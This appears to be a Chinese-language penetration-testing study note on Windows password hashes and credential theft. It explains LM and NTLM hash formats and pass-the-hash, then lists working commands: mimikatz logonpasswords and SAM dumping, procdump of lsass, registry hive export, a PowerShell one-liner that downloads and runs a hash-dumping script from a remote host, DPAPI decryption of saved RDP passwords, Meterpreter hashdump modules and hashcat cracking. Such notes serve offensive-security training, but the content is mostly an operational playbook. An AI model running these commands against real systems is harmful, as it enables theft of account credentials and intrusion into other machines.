## Windows Hash
Windows使用
- LAN Manager Hash: 较老, 暴力破解
- NT LAN Manager Hash (v2)
- Kerberos

### LM-HASH
格式: `用户名称:RID:LM-HASH值:NTLM-HASH值`

基于DES加密
大小写不敏感
长度限制14字符, 即截取文本前14字符

LM-HASH值为`AAD3B435B51404EEAAD3B435B51404EE`时, 通常表示
- 用户密码为空
- 系统未使用LM-HASH算法处理密码

存储位置
- SAM文件, 本地计算机: `C:\windows\system32\config\SAM`
- NTDS.DIT文件, 域控制器: `C:\windows\NTDS\NTDS.dit`

由于LM-HASH最长为14, 算法会将其分为两组后分别变换, 分别进行DES加密后拼接. 所以, 当密码小于等于7位时, 后7位都是**补0**, 可以得知密钥长度范围
![](../../img/Pasted%20image%2020250609133303.png)

### NTLM-HASH
1. 将密码字符串转化为十六进制ACSII字符串
2. 十六进制转换位Unicode字符串
3. MD4(Unicode), 产生16字节的结果

## Windows 认证
- 本地认证
	1. `winlogon.exe`用户输入密码
	2. `lsass.exe`计算成NTLM Hash, 可以使用`mimikatz`读取明文密码
	3. 哈希值与SAM中的比对
	4. 登录结果
- 网络认证: 远程链接
![](../../img/Pasted%20image%2020250609141720.png)
- 域认证: 登录到域环境中的设备

hashcat破解
hashcat -m 5600 net-ntlm-hash /tmp/password.list -o found.txt --force

PTH攻击: Pass The Hash
NTLM认证协议中允许使用用户的密码哈希值进行认证, 不需要实际的密码
使用网络嗅探或利用漏洞等方式获取NTLM哈希, 模拟认证请求建立会话

## 系统用户凭证获取
### mimikatz 猕猴桃
https://github.com/gentilkiwi/mimikatz
`mimikatz.exe`

权限提升
`privilege::debug`

抓取登录密码
`sekurlsa::logonpasswords`

提升当前进程的令牌权限 --》administrator
`token::elevate`

从Windows SAM数据库中提取密码Hash
`lsadump::sam`

提取Windows系统中存储的敏感信息, 如密码, 密钥和其它凭据
`lsadump::secrets`

### Get-PassHashes
https://gitee.com/yijingsec/nishang/raw/master/Gather/Get-PassHashes.ps1
`powershell IEX(new-object net.webclient).downloadstring('http://192.168.81.154:8000/Get-PassHashes.ps1');Get-PassHashes`
### Procdump
微软Sysinternals套件中的工具, 捕获并转储正在运行的进程的内存, 即提取密码哈希和明文密码
https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

`procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`

使用mimikatz还原
`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"`

注册表文件
```
# 导出 SYSTEM键值  
reg save HKLM\SYSTEM system.hiv  
# 导出 SAM键值  
reg save HKLM\SAM sam.hiv  
# 导出 SECURITY键值  
reg save HKLM\SECURITY security.hiv

# mimikatz分析到处的注册表文件
mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" "exit"
```

https://gitee.com/yijingsec/impacket/tree/master/examples
https://gitee.com/yijingsec/impacket-examples-windows

### LaZagne
https://github.com/AlessandroZ/LaZagne

### MSF - Meterpreter
post/windows/gather/hashdump
post/windows/gather/smart_hashdump
load kiwi

### Hash 破解
https://www.cmd5.com/
https://www.somd5.com/
https://www.sqlsec.com/2019/10/hashcat.html

## 其他密码凭证获取

### RDP链接密码
查看本地机器连接过的目标机器
`reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s`

查看RDP密码文件
`dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*`

保存在本地的远程主机信息, 包括RDP连接凭据
`cmdkey /list`

选取一个刚才的密码文件对其解密, 得到`guidMasterKey`
`privilege::debug`
`dpapi::cred /in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\<Password Filename>

根据guidMasterKey, 找到对应的`Masterkey`
`sekurlsa::dpapi`

通过Masterkey解密pbData数据, 拿到明文RDP连接密码
`dpapi::cred /in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266 /masterkey:f391aa638da6b6d846685f84660ee638bd6d3122214de34285b4dd3bd827a5c3925c5bd7a448c175457c19b2556c9f6f5248ef9256060a5b74c1264d3a5a99f8`

### Cobaltstrike


### MySQL文件获取
`.frm`表结构
`.MYI`索引数据
`.MYD`表数据, 其中有用户密码

加密方式
- MYSQL323: MySQL 4.1以前, `Old_Password()`, 16位字符串
- MYSQLSHA1: 4.1及以后, `Password()`, 41位字符串

- `user.MYD` 保存了用户的密码, 使用二进制查看即可得到密码的HASH值
- 使用*hashcat*破解哈希值

`hashcat.exe -m 300 -a 3 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`

`-m 300指定了323加密方式`